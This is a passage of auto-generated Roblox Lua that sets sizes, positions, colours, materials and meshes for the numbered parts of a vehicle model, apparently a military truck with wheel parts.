SpecialMesh390.Parent = WedgePart389
SpecialMesh390.MeshType = Enum.MeshType.Wedge
WedgePart391.Parent = Model0
WedgePart391.Material = Enum.Material.Metal
WedgePart391.BrickColor = BrickColor.new("Grime")
WedgePart391.Rotation = Vector3.new(-180, 90, 0)
WedgePart391.CanCollide = false
WedgePart391.FormFactor = Enum.FormFactor.Custom
WedgePart391.Size = Vector3.new(5.19999981, 0.800000072, 0.600000024)
WedgePart391.CFrame = CFrame.new(-4.60982037, 4.80040455, 44.0597725, 1.23189566e-05, -7.03911064e-06, 1, -4.74273656e-06, -0.999981761, -7.78240428e-06, 1.00000024, -1.52694429e-05, -2.73172082e-05)
WedgePart391.BottomSurface = Enum.SurfaceType.Weld
WedgePart391.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart391.Position = Vector3.new(-4.60982037, 4.80040455, 44.0597725)
WedgePart391.Orientation = Vector3.new(0, 90, -180)
WedgePart391.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh392.Parent = WedgePart391
SpecialMesh392.MeshType = Enum.MeshType.Wedge
WedgePart393.Parent = Model0
WedgePart393.Material = Enum.Material.Metal
WedgePart393.BrickColor = BrickColor.new("Grime")
WedgePart393.Rotation = Vector3.new(180, -90, 0)
WedgePart393.FormFactor = Enum.FormFactor.Custom
WedgePart393.Size = Vector3.new(5.19999981, 0.800000072, 1.4000001)
WedgePart393.CFrame = CFrame.new(4.59036112, 6.80025482, 44.0597649, -1.38457381e-07, -6.21204481e-06, -1, -1.1573351e-05, -0.999996543, 6.72009583e-06, -1, 3.97761823e-06, 1.09616794e-05)
WedgePart393.BottomSurface = Enum.SurfaceType.Weld
WedgePart393.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart393.Position = Vector3.new(4.59036112, 6.80025482, 44.0597649)
WedgePart393.Orientation = Vector3.new(0, -90, -180)
WedgePart393.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh394.Parent = WedgePart393
SpecialMesh394.MeshType = Enum.MeshType.Wedge
WedgePart395.Parent = Model0
WedgePart395.Material = Enum.Material.Metal
WedgePart395.BrickColor = BrickColor.new("Grime")
WedgePart395.Rotation = Vector3.new(180, -90, 0)
WedgePart395.FormFactor = Enum.FormFactor.Custom
WedgePart395.Size = Vector3.new(5.19999981, 0.800000072, 1.4000001)
WedgePart395.CFrame = CFrame.new(4.59042549, 6.80014467, 33.6591415, 5.75830927e-06, -5.91780463e-06, -1, -1.57273789e-05, -1, 6.3936277e-06, -1, 8.98918006e-06, 3.81148857e-06)
WedgePart395.BottomSurface = Enum.SurfaceType.Weld
WedgePart395.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart395.Position = Vector3.new(4.59042549, 6.80014467, 33.6591415)
WedgePart395.Orientation = Vector3.new(0, -90, -180)
WedgePart395.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh396.Parent = WedgePart395
SpecialMesh396.MeshType = Enum.MeshType.Wedge
WedgePart397.Parent = Model0
WedgePart397.Material = Enum.Material.Metal
WedgePart397.BrickColor = BrickColor.new("Grime")
WedgePart397.Rotation = Vector3.new(180, 90, 0)
WedgePart397.CanCollide = false
WedgePart397.FormFactor = Enum.FormFactor.Custom
WedgePart397.Size = Vector3.new(5.19999981, 1.60000014, 0.400000006)
WedgePart397.CFrame = CFrame.new(-4.10966873, 3.60070205, 44.0600739, -1.83692464e-05, -5.51331595e-06, 1, 1.6215803e-05, -0.99999088, -5.89260162e-06, 1.00000012, 1.0839356e-05, 1.07093201e-05)
WedgePart397.BottomSurface = Enum.SurfaceType.Weld
WedgePart397.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart397.Position = Vector3.new(-4.10966873, 3.60070205, 44.0600739)
WedgePart397.Orientation = Vector3.new(0, 90, 180)
WedgePart397.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh398.Parent = WedgePart397
SpecialMesh398.MeshType = Enum.MeshType.Wedge
WedgePart399.Parent = Model0
WedgePart399.Material = Enum.Material.Metal
WedgePart399.BrickColor = BrickColor.new("Grime")
WedgePart399.Rotation = Vector3.new(-180, -90, 0)
WedgePart399.FormFactor = Enum.FormFactor.Custom
WedgePart399.Size = Vector3.new(5.19999981, 1.20000005, 0.800000072)
WedgePart399.CFrame = CFrame.new(3.49025035, 5.80047512, 44.0598679, 1.49187254e-05, -5.46336423e-06, -1, 1.28550873e-05, -0.99999088, 5.84314057e-06, -1.00000012, -1.82317744e-05, -7.25863902e-06)
WedgePart399.BottomSurface = Enum.SurfaceType.Weld
WedgePart399.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart399.Position = Vector3.new(3.49025035, 5.80047512, 44.0598679)
WedgePart399.Orientation = Vector3.new(0, -90, 180)
WedgePart399.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh400.Parent = WedgePart399
SpecialMesh400.MeshType = Enum.MeshType.Wedge
WedgePart401.Parent = Model0
WedgePart401.Material = Enum.Material.Metal
WedgePart401.BrickColor = BrickColor.new("Grime")
WedgePart401.Rotation = Vector3.new(-180, -90, 0)
WedgePart401.FormFactor = Enum.FormFactor.Custom
WedgePart401.Size = Vector3.new(5.19999981, 2.4000001, 0.800000072)
WedgePart401.CFrame = CFrame.new(2.69040108, 4.00057888, 33.659893, -1.2307155e-05, -6.81548408e-06, -1, 4.87608668e-06, -1, 6.82578775e-06, -1, -5.02421426e-06, 1.25180559e-05)
WedgePart401.BottomSurface = Enum.SurfaceType.Weld
WedgePart401.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart401.Position = Vector3.new(2.69040108, 4.00057888, 33.659893)
WedgePart401.Orientation = Vector3.new(0, -90, 180)
WedgePart401.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh402.Parent = WedgePart401
SpecialMesh402.MeshType = Enum.MeshType.Wedge
WedgePart403.Parent = Model0
WedgePart403.Material = Enum.Material.Metal
WedgePart403.BrickColor = BrickColor.new("Grime")
WedgePart403.Rotation = Vector3.new(180, 90, 0)
WedgePart403.FormFactor = Enum.FormFactor.Custom
WedgePart403.Size = Vector3.new(5.19999981, 1.4000001, 1.80000007)
WedgePart403.CFrame = CFrame.new(15.3911648, 6.50011253, 33.6598206, -5.57357816e-06, -6.14820556e-06, 1, 6.22643574e-06, -1, -6.27145073e-06, 1, 4.4634462e-06, 3.06545007e-06)
WedgePart403.BottomSurface = Enum.SurfaceType.Weld
WedgePart403.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart403.Position = Vector3.new(15.3911648, 6.50011253, 33.6598206)
WedgePart403.Orientation = Vector3.new(0, 90, 180)
WedgePart403.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh404.Parent = WedgePart403
SpecialMesh404.MeshType = Enum.MeshType.Wedge
WedgePart405.Parent = Model0
WedgePart405.Material = Enum.Material.Metal
WedgePart405.BrickColor = BrickColor.new("Grime")
WedgePart405.Rotation = Vector3.new(180, 90, 0)
WedgePart405.CanCollide = false
WedgePart405.FormFactor = Enum.FormFactor.Custom
WedgePart405.Size = Vector3.new(5.19999981, 0.800000072, 0.600000024)
WedgePart405.CFrame = CFrame.new(-4.60990286, 4.80025768, 33.6599922, -1.13140413e-05, -5.86295255e-06, 1, 1.95633838e-05, -0.999981761, -6.5924678e-06, 1.00000024, 9.23195239e-06, -3.40660699e-06)
WedgePart405.BottomSurface = Enum.SurfaceType.Weld
WedgePart405.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart405.Position = Vector3.new(-4.60990286, 4.80025768, 33.6599922)
WedgePart405.Orientation = Vector3.new(0, 90, 180)
WedgePart405.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh406.Parent = WedgePart405
SpecialMesh406.MeshType = Enum.MeshType.Wedge
WedgePart407.Parent = Model0
WedgePart407.Material = Enum.Material.Metal
WedgePart407.BrickColor = BrickColor.new("Grime")
WedgePart407.Rotation = Vector3.new(180, -90, 0)
WedgePart407.FormFactor = Enum.FormFactor.Custom
WedgePart407.Size = Vector3.new(1.59999871, 2, 1.79999995)
WedgePart407.CFrame = CFrame.new(-16.609375, 5.00049973, 45.8597336, 6.52338531e-06, -6.1213882e-06, -1, -1.60775817e-05, -1, 6.68229768e-06, -1, 8.12245889e-06, 4.77771937e-06)
WedgePart407.BottomSurface = Enum.SurfaceType.Smooth
WedgePart407.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart407.Position = Vector3.new(-16.609375, 5.00049973, 45.8597336)
WedgePart407.Orientation = Vector3.new(0, -90, -180)
WedgePart407.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh408.Parent = WedgePart407
SpecialMesh408.MeshType = Enum.MeshType.Wedge
Part409.Parent = Model0
Part409.Material = Enum.Material.Metal
Part409.BrickColor = BrickColor.new("Grime")
Part409.Rotation = Vector3.new(180, 0, -180)
Part409.FormFactor = Enum.FormFactor.Custom
Part409.Size = Vector3.new(1.19999981, 1.20000005, 15.999999)
Part409.CFrame = CFrame.new(18.0901623, 3.40006208, 38.8598328, -1, 6.87710462e-06, -1.40845405e-05, 7.06488026e-06, 1, -9.22855088e-06, 1.79022245e-05, -6.54521045e-06, -1)
Part409.BackSurface = Enum.SurfaceType.Weld
Part409.BottomSurface = Enum.SurfaceType.Weld
Part409.LeftSurface = Enum.SurfaceType.Weld
Part409.RightSurface = Enum.SurfaceType.Weld
Part409.TopSurface = Enum.SurfaceType.Weld
Part409.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part409.Position = Vector3.new(18.0901623, 3.40006208, 38.8598328)
Part409.Orientation = Vector3.new(0, -180, 0)
Part409.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh410.Parent = Part409
Part411.Parent = Model0
Part411.Material = Enum.Material.Metal
Part411.BrickColor = BrickColor.new("Grime")
Part411.Rotation = Vector3.new(-180, 0, -180)
Part411.FormFactor = Enum.FormFactor.Custom
Part411.Size = Vector3.new(2.00000024, 4, 15.6000004)
Part411.CFrame = CFrame.new(18.0899773, 6.00011158, 38.8595161, -1, 8.79176241e-06, -5.25169889e-05, 8.88845261e-06, 1, 7.70221322e-06, 5.44925242e-05, 9.09026676e-06, -1)
Part411.BackSurface = Enum.SurfaceType.Weld
Part411.BottomSurface = Enum.SurfaceType.Weld
Part411.FrontSurface = Enum.SurfaceType.Weld
Part411.LeftSurface = Enum.SurfaceType.Weld
Part411.RightSurface = Enum.SurfaceType.Weld
Part411.TopSurface = Enum.SurfaceType.Weld
Part411.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part411.Position = Vector3.new(18.0899773, 6.00011158, 38.8595161)
Part411.Orientation = Vector3.new(0, -180, 0)
Part411.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh412.Parent = Part411
Part413.Parent = Model0
Part413.Material = Enum.Material.Metal
Part413.BrickColor = BrickColor.new("Grime")
Part413.Rotation = Vector3.new(-180, 0, -180)
Part413.CanCollide = false
Part413.FormFactor = Enum.FormFactor.Custom
Part413.Size = Vector3.new(6.19999981, 2.39999986, 5.19999981)
Part413.CFrame = CFrame.new(-0.809948921, 4.00028038, 44.0597649, -1, 6.57104692e-06, -7.88472062e-06, 6.95060317e-06, 0.99999088, 2.1937858e-06, 1.55447615e-05, 7.57022963e-06, -1.00000012)
Part413.BackSurface = Enum.SurfaceType.Weld
Part413.BottomSurface = Enum.SurfaceType.Weld
Part413.FrontSurface = Enum.SurfaceType.Weld
Part413.LeftSurface = Enum.SurfaceType.Weld
Part413.RightSurface = Enum.SurfaceType.Weld
Part413.TopSurface = Enum.SurfaceType.Weld
Part413.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part413.Position = Vector3.new(-0.809948921, 4.00028038, 44.0597649)
Part413.Orientation = Vector3.new(0, -180, 0)
Part413.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh414.Parent = Part413
Part415.Parent = Model0
Part415.Material = Enum.Material.Metal
Part415.BrickColor = BrickColor.new("Grime")
Part415.Rotation = Vector3.new(180, 0, -180)
Part415.FormFactor = Enum.FormFactor.Custom
Part415.Size = Vector3.new(13.1999998, 1.19999969, 12.4000006)
Part415.CFrame = CFrame.new(10.0900612, 3.40011263, 38.85989, -1, 6.44758302e-06, -5.45887087e-06, 6.45471619e-06, 1, -7.73913871e-06, 5.60309672e-06, -7.63776461e-06, -1)
Part415.BottomSurface = Enum.SurfaceType.Weld
Part415.LeftSurface = Enum.SurfaceType.Weld
Part415.RightSurface = Enum.SurfaceType.Weld
Part415.TopSurface = Enum.SurfaceType.Weld
Part415.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part415.Position = Vector3.new(10.0900612, 3.40011263, 38.85989)
Part415.Orientation = Vector3.new(0, -180, 0)
Part415.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh416.Parent = Part415
BlockMesh416.Offset = Vector3.new(0, 2, 0)
BlockMesh416.Scale = Vector3.new(1.20000005, 4.33400011, 1)
BlockMesh416.Scale = Vector3.new(1.20000005, 4.33400011, 1)
Part417.Parent = Model0
Part417.Material = Enum.Material.Metal
Part417.BrickColor = BrickColor.new("Really black")
Part417.Rotation = Vector3.new(90, -90, 0)
Part417.CanCollide = false
Part417.FormFactor = Enum.FormFactor.Custom
Part417.Size = Vector3.new(5.5999999, 1.79999995, 5.60000038)
Part417.CFrame = CFrame.new(-7.30992794, 2.80029297, 45.9599228, -5.31013347e-06, -1.75913701e-05, -1, -1, 8.41797737e-06, 5.30998523e-06, 8.4178846e-06, 1, -1.75914138e-05)
Part417.BottomSurface = Enum.SurfaceType.Weld
Part417.FrontSurface = Enum.SurfaceType.Weld
Part417.LeftSurface = Enum.SurfaceType.Weld
Part417.RightSurface = Enum.SurfaceType.Weld
Part417.TopSurface = Enum.SurfaceType.Weld
Part417.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part417.Position = Vector3.new(-7.30992794, 2.80029297, 45.9599228)
Part417.Orientation = Vector3.new(0, -90, -90)
Part417.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
CylinderMesh418.Parent = Part417
Part419.Name = "wheel"
Part419.Parent = Model0
Part419.Material = Enum.Material.Metal
Part419.BrickColor = BrickColor.new("Grime")
Part419.Transparency = 1
Part419.Rotation = Vector3.new(90, 90, 0)
Part419.FormFactor = Enum.FormFactor.Symmetric
Part419.Friction = 1
Part419.Shape = Enum.PartType.Ball
Part419.Size = Vector3.new(5, 5, 5)
Part419.CFrame = CFrame.new(18.0901184, 2.99934506, 28.3597851, 2.72848411e-09, 5.54910464e-08, 1, 1, 4.68062353e-08, -3.27418093e-09, -3.90050445e-08, 1, -6.65888464e-08)
Part419.BottomSurface = Enum.SurfaceType.Smooth
Part419.TopSurface = Enum.SurfaceType.Hinge
Part419.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part419.Position = Vector3.new(18.0901184, 2.99934506, 28.3597851)
Part419.Orientation = Vector3.new(0, 90, 90)
Part419.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh420.Parent = Part419
CylinderMesh420.Offset = Vector3.new(0, -1.10000002, 0)
CylinderMesh420.Scale = Vector3.new(1, 0.600000024, 1)
CylinderMesh420.Scale = Vector3.new(1, 0.600000024, 1)
Part421.Parent = Model0
Part421.Material = Enum.Material.Metal
Part421.BrickColor = BrickColor.new("Really black")
Part421.Rotation = Vector3.new(-90, 90, 0)
Part421.CanCollide = false
Part421.FormFactor = Enum.FormFactor.Custom
Part421.Size = Vector3.new(5.5999999, 1.79999995, 5.60000038)
Part421.CFrame = CFrame.new(6.2899642, 2.80008507, 31.7599297, -6.44921874e-06, -5.4921652e-06, 1, -1, -7.7157365e-06, -6.45307955e-06, 7.66116682e-06, -1, -5.5698024e-06)
Part421.BottomSurface = Enum.SurfaceType.Weld
Part421.FrontSurface = Enum.SurfaceType.Weld
Part421.LeftSurface = Enum.SurfaceType.Weld
Part421.RightSurface = Enum.SurfaceType.Weld
Part421.TopSurface = Enum.SurfaceType.Weld
Part421.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part421.Position = Vector3.new(6.2899642, 2.80008507, 31.7599297)
Part421.Orientation = Vector3.new(0, 90, -90)
Part421.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
CylinderMesh422.Parent = Part421
Part423.Parent = Model0
Part423.Material = Enum.Material.Metal
Part423.BrickColor = BrickColor.new("Really black")
Part423.Rotation = Vector3.new(-90, 90, 0)
Part423.CanCollide = false
Part423.FormFactor = Enum.FormFactor.Custom
Part423.Size = Vector3.new(5.5999999, 1.79999995, 5.60000038)
Part423.CFrame = CFrame.new(13.4899158, 2.80003095, 31.7598763, -6.44921874e-06, -5.4921652e-06, 1, -1, -7.7157365e-06, -6.45307955e-06, 7.66116682e-06, -1, -5.5698024e-06)
Part423.BottomSurface = Enum.SurfaceType.Weld
Part423.FrontSurface = Enum.SurfaceType.Weld
Part423.LeftSurface = Enum.SurfaceType.Weld
Part423.RightSurface = Enum.SurfaceType.Weld
Part423.TopSurface = Enum.SurfaceType.Smooth
Part423.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part423.Position = Vector3.new(13.4899158, 2.80003095, 31.7598763)
Part423.Orientation = Vector3.new(0, 90, -90)
Part423.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
CylinderMesh424.Parent = Part423
Part425.Parent = Model0
Part425.Material = Enum.Material.Metal
Part425.BrickColor = BrickColor.new("Really black")
Part425.Rotation = Vector3.new(90, -90, 0)
Part425.CanCollide = false
Part425.FormFactor = Enum.FormFactor.Custom
Part425.Size = Vector3.new(5.5999999, 1.79999995, 5.60000038)
Part425.CFrame = CFrame.new(6.29016876, 2.80019403, 45.9599304, -6.44921874e-06, 5.4921652e-06, -1, -1, 7.7157365e-06, 6.45307955e-06, 7.66116682e-06, 1, 5.5698024e-06)
Part425.BottomSurface = Enum.SurfaceType.Weld
Part425.FrontSurface = Enum.SurfaceType.Weld
Part425.LeftSurface = Enum.SurfaceType.Weld
Part425.RightSurface = Enum.SurfaceType.Weld
Part425.TopSurface = Enum.SurfaceType.Weld
Part425.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part425.Position = Vector3.new(6.29016876, 2.80019403, 45.9599304)
Part425.Orientation = Vector3.new(0, -90, -90)
Part425.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
CylinderMesh426.Parent = Part425
Part427.Parent = Model0
Part427.Material = Enum.Material.Metal
Part427.BrickColor = BrickColor.new("Grime")
Part427.Rotation = Vector3.new(-180, 0, -180)
Part427.CanCollide = false
Part427.FormFactor = Enum.FormFactor.Custom
Part427.Size = Vector3.new(0.800000191, 1.40000021, 5.19999981)
Part427.CFrame = CFrame.new(16.6901779, 6.50009441, 44.059761, -1, 7.6314127e-06, -2.93200592e-05, 7.72801832e-06, 1, 1.66543414e-05, 3.12956508e-05, 1.80426377e-05, -1)
Part427.BackSurface = Enum.SurfaceType.Weld
Part427.BottomSurface = Enum.SurfaceType.Weld
Part427.FrontSurface = Enum.SurfaceType.Weld
Part427.LeftSurface = Enum.SurfaceType.Weld
Part427.RightSurface = Enum.SurfaceType.Weld
Part427.TopSurface = Enum.SurfaceType.Weld
Part427.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part427.Position = Vector3.new(16.6901779, 6.50009441, 44.059761)
Part427.Orientation = Vector3.new(0, -180, 0)
Part427.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh428.Parent = Part427
WedgePart429.Parent = Model0
WedgePart429.Material = Enum.Material.Metal
WedgePart429.BrickColor = BrickColor.new("Grime")
WedgePart429.Rotation = Vector3.new(-180, -90, 0)
WedgePart429.FormFactor = Enum.FormFactor.Custom
WedgePart429.Size = Vector3.new(5.19999981, 2.4000001, 0.800000072)
WedgePart429.CFrame = CFrame.new(2.69045496, 4.00031519, 44.0597382, -1.79814906e-05, -7.07093022e-06, -1, 9.26739267e-06, -0.99999088, 7.4503323e-06, -1.00000012, -1.46438188e-05, 2.5641586e-05)
WedgePart429.BottomSurface = Enum.SurfaceType.Weld
WedgePart429.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart429.Position = Vector3.new(2.69045496, 4.00031519, 44.0597382)
WedgePart429.Orientation = Vector3.new(0, -90, 180)
WedgePart429.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh430.Parent = WedgePart429
SpecialMesh430.MeshType = Enum.MeshType.Wedge
WedgePart431.Parent = Model0
WedgePart431.Material = Enum.Material.Metal
WedgePart431.BrickColor = BrickColor.new("Grime")
WedgePart431.Rotation = Vector3.new(180, 90, 0)
WedgePart431.FormFactor = Enum.FormFactor.Custom
WedgePart431.Size = Vector3.new(5.19999981, 1.4000001, 1.80000007)
WedgePart431.CFrame = CFrame.new(15.3902655, 6.50043106, 44.0596695, -1.61600074e-05, -5.6243216e-06, 1, 1.58236417e-05, -1, -6.17393925e-06, 1, 7.96042968e-06, 4.97321707e-06)
WedgePart431.BottomSurface = Enum.SurfaceType.Weld
WedgePart431.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart431.Position = Vector3.new(15.3902655, 6.50043106, 44.0596695)
WedgePart431.Orientation = Vector3.new(0, 90, 180)
WedgePart431.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh432.Parent = WedgePart431
SpecialMesh432.MeshType = Enum.MeshType.Wedge
Part433.Name = "wheel"
Part433.Parent = Model0
Part433.Material = Enum.Material.Metal
Part433.BrickColor = BrickColor.new("Grime")
Part433.Transparency = 1
Part433.Rotation = Vector3.new(-90, -90, 0)
Part433.FormFactor = Enum.FormFactor.Symmetric
Part433.Friction = 1
Part433.Shape = Enum.PartType.Ball
Part433.Size = Vector3.new(5, 5, 5)
Part433.CFrame = CFrame.new(18.0901108, 2.99934506, 49.3595123, 2.72848411e-09, -5.54910464e-08, -1, 1, -4.68062353e-08, 3.27418093e-09, -3.90050445e-08, -1, 6.65888464e-08)
Part433.BottomSurface = Enum.SurfaceType.Smooth
Part433.TopSurface = Enum.SurfaceType.Hinge
Part433.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part433.Position = Vector3.new(18.0901108, 2.99934506, 49.3595123)
Part433.Orientation = Vector3.new(0, -90, 90)
Part433.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh434.Parent = Part433
CylinderMesh434.Offset = Vector3.new(0, -1.10000002, 0)
CylinderMesh434.Scale = Vector3.new(1, 0.600000024, 1)
CylinderMesh434.Scale = Vector3.new(1, 0.600000024, 1)
Part435.Parent = Model0
Part435.Material = Enum.Material.Metal
Part435.BrickColor = BrickColor.new("Really black")
Part435.Rotation = Vector3.new(90, -90, 0)
Part435.CanCollide = false
Part435.FormFactor = Enum.FormFactor.Custom
Part435.Size = Vector3.new(5.5999999, 1.79999995, 5.60000038)
Part435.CFrame = CFrame.new(13.4901199, 2.80014706, 45.9598923, -6.44921874e-06, 5.4921652e-06, -1, -1, 7.7157365e-06, 6.45307955e-06, 7.66116682e-06, 1, 5.5698024e-06)
Part435.BottomSurface = Enum.SurfaceType.Weld
Part435.FrontSurface = Enum.SurfaceType.Weld
Part435.LeftSurface = Enum.SurfaceType.Weld
Part435.RightSurface = Enum.SurfaceType.Weld
Part435.TopSurface = Enum.SurfaceType.Smooth
Part435.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part435.Position = Vector3.new(13.4901199, 2.80014706, 45.9598923)
Part435.Orientation = Vector3.new(0, -90, -90)
Part435.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
CylinderMesh436.Parent = Part435
Part437.Parent = Model0
Part437.Material = Enum.Material.Metal
Part437.BrickColor = BrickColor.new("Grime")
Part437.Rotation = Vector3.new(90, -90, 0)
Part437.CanCollide = false
Part437.FormFactor = Enum.FormFactor.Custom
Part437.Size = Vector3.new(3.59999943, 0.200000003, 3.20000005)
Part437.CFrame = CFrame.new(-13.9098864, 2.80032659, 46.9600143, -6.56966131e-06, -1.93433134e-05, -1, -1, 9.822832e-06, 6.56947122e-06, 9.82270558e-06, 1, -1.93433771e-05)
Part437.BottomSurface = Enum.SurfaceType.Weld
Part437.FrontSurface = Enum.SurfaceType.Weld
Part437.LeftSurface = Enum.SurfaceType.Weld
Part437.RightSurface = Enum.SurfaceType.Weld
Part437.TopSurface = Enum.SurfaceType.Weld
Part437.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part437.Position = Vector3.new(-13.9098864, 2.80032659, 46.9600143)
Part437.Orientation = Vector3.new(0, -90, -90)
Part437.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh438.Parent = Part437
CylinderMesh438.Offset = Vector3.new(0, -0.170000002, 0)
Part439.Parent = Model0
Part439.Material = Enum.Material.Metal
Part439.BrickColor = BrickColor.new("Grime")
Part439.Rotation = Vector3.new(90, -90, 0)
Part439.CanCollide = false
Part439.FormFactor = Enum.FormFactor.Custom
Part439.Size = Vector3.new(3.59999943, 0.200000003, 3.20000005)
Part439.CFrame = CFrame.new(13.5900993, 2.8001523, 46.9598885, -6.44267539e-06, 5.35898835e-06, -1, -1, 7.80934624e-06, 6.45962518e-06, 7.56755799e-06, 1, 5.70298016e-06)
Part439.BottomSurface = Enum.SurfaceType.Weld
Part439.FrontSurface = Enum.SurfaceType.Weld
Part439.LeftSurface = Enum.SurfaceType.Weld
Part439.RightSurface = Enum.SurfaceType.Weld
Part439.TopSurface = Enum.SurfaceType.Weld
Part439.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part439.Position = Vector3.new(13.5900993, 2.8001523, 46.9598885)
Part439.Orientation = Vector3.new(0, -90, -90)
Part439.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh440.Parent = Part439
CylinderMesh440.Offset = Vector3.new(0, -0.170000002, 0)
Part441.Parent = Model0
Part441.Material = Enum.Material.Metal
Part441.BrickColor = BrickColor.new("Grime")
Part441.Rotation = Vector3.new(90, -90, 0)
Part441.CanCollide = false
Part441.FormFactor = Enum.FormFactor.Custom
Part441.Size = Vector3.new(3.59999943, 0.200000003, 3.20000005)
Part441.CFrame = CFrame.new(6.28996181, 2.70008087, 30.7599239, -6.44267539e-06, 5.35898835e-06, -1, -1, 7.80934624e-06, 6.45962518e-06, 7.56755799e-06, 1, 5.70298016e-06)
Part441.BottomSurface = Enum.SurfaceType.Weld
Part441.FrontSurface = Enum.SurfaceType.Weld
Part441.LeftSurface = Enum.SurfaceType.Weld
Part441.RightSurface = Enum.SurfaceType.Weld
Part441.TopSurface = Enum.SurfaceType.Weld
Part441.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part441.Position = Vector3.new(6.28996181, 2.70008087, 30.7599239)
Part441.Orientation = Vector3.new(0, -90, -90)
Part441.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh442.Parent = Part441
CylinderMesh442.Offset = Vector3.new(0, -0.170000002, 0)
Part443.Parent = Model0
Part443.Material = Enum.Material.Metal
Part443.BrickColor = BrickColor.new("Grime")
Part443.Rotation = Vector3.new(90, -90, 0)
Part443.CanCollide = false
Part443.FormFactor = Enum.FormFactor.Custom
Part443.Size = Vector3.new(3.59999943, 0.200000003, 3.20000005)
Part443.CFrame = CFrame.new(-7.40999508, 2.70016646, 30.7599983, -6.36196455e-06, 3.71647275e-06, -1, -1, 8.96386427e-06, 6.54035557e-06, 6.41305041e-06, 1, 7.34550258e-06)
Part443.BottomSurface = Enum.SurfaceType.Weld
Part443.FrontSurface = Enum.SurfaceType.Weld
Part443.LeftSurface = Enum.SurfaceType.Weld
Part443.RightSurface = Enum.SurfaceType.Weld
Part443.TopSurface = Enum.SurfaceType.Weld
Part443.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part443.Position = Vector3.new(-7.40999508, 2.70016646, 30.7599983)
Part443.Orientation = Vector3.new(0, -90, -90)
Part443.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh444.Parent = Part443
CylinderMesh444.Offset = Vector3.new(0, -0.170000002, 0)
Part445.Parent = Model0
Part445.Material = Enum.Material.Metal
Part445.BrickColor = BrickColor.new("Grime")
Part445.Rotation = Vector3.new(90, -90, 0)
Part445.CanCollide = false
Part445.FormFactor = Enum.FormFactor.Custom
Part445.Size = Vector3.new(3.59999943, 0.200000003, 3.20000005)
Part445.CFrame = CFrame.new(13.4899139, 2.70003438, 30.759882, -6.44267539e-06, 5.35898835e-06, -1, -1, 7.80934624e-06, 6.45962518e-06, 7.56755799e-06, 1, 5.70298016e-06)
Part445.BottomSurface = Enum.SurfaceType.Weld
Part445.FrontSurface = Enum.SurfaceType.Weld
Part445.LeftSurface = Enum.SurfaceType.Weld
Part445.RightSurface = Enum.SurfaceType.Weld
Part445.TopSurface = Enum.SurfaceType.Weld
Part445.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part445.Position = Vector3.new(13.4899139, 2.70003438, 30.759882)
Part445.Orientation = Vector3.new(0, -90, -90)
Part445.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh446.Parent = Part445
CylinderMesh446.Offset = Vector3.new(0, -0.170000002, 0)
Part447.Parent = Model0
Part447.Material = Enum.Material.Metal
Part447.BrickColor = BrickColor.new("Grime")
Part447.Rotation = Vector3.new(90, -90, 0)
Part447.CanCollide = false
Part447.FormFactor = Enum.FormFactor.Custom
Part447.Size = Vector3.new(3.59999943, 0.200000003, 3.20000005)
Part447.CFrame = CFrame.new(-13.9099846, 2.80021143, 30.7600117, -6.36196455e-06, 3.71647275e-06, -1, -1, 8.96386427e-06, 6.54035557e-06, 6.41305041e-06, 1, 7.34550258e-06)
Part447.BottomSurface = Enum.SurfaceType.Weld
Part447.FrontSurface = Enum.SurfaceType.Weld
